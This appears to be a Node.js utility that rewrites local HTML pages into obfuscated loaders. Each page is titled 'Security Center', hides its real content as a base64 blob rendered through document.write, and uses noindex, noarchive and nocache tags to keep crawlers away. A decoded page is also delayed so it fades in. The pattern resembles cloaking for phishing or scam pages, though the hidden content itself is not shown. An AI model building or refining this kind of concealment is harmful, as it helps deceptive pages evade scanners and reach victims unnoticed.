const fs = require('fs');

function rebuildPayloadWithDelay(filePath) {
    if (!fs.existsSync(filePath)) return;
    let content = fs.readFileSync(filePath, 'utf8');
    
    const match = content.match(/var _0xpayload = "(.*?)";/);
    if (!match) return;

    let decoded = Buffer.from(match[1], 'base64').toString('utf8');

    // Add CSS delay to the decrypted DOM
    const delayScript = `
    <style>html { opacity: 0; transition: opacity 0.2s; }</style>
    <script>setTimeout(function() { document.documentElement.style.opacity = '1'; }, 200);</script>
    `;
    
    if (decoded.includes('</head>')) {
        decoded = decoded.replace('</head>', delayScript + '</head>');
    } else {
        decoded = delayScript + decoded;
    }

    const newB64 = Buffer.from(decoded).toString('base64');

    const newLoader = `<!DOCTYPE html>
<html>
<head>
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, nocache">
  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, nocache">
  <title>Security Center</title>
</head>
<body style="background:#fff;width:100vw;height:100vh;margin:0;cursor:default;">
  <script>
    var _0xpayload = "${newB64}";
    var binaryString = atob(_0xpayload);
    var bytes = new Uint8Array(binaryString.length);
    for (var i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }
    document.open();
    document.write(new TextDecoder().decode(bytes));
    document.close();
  </script>
</body>
</html>`;

    fs.writeFileSync(filePath, newLoader, 'utf8');
}

rebuildPayloadWithDelay('c:\\Users\\acer\\Desktop\\US-P\\z3b5n1p\\index.html');
rebuildPayloadWithDelay('c:\\Users\\acer\\Desktop\\US-P\\x8f9q2m\\index.html');

console.log("Rebuilt with synchronous document.write and visual delay");
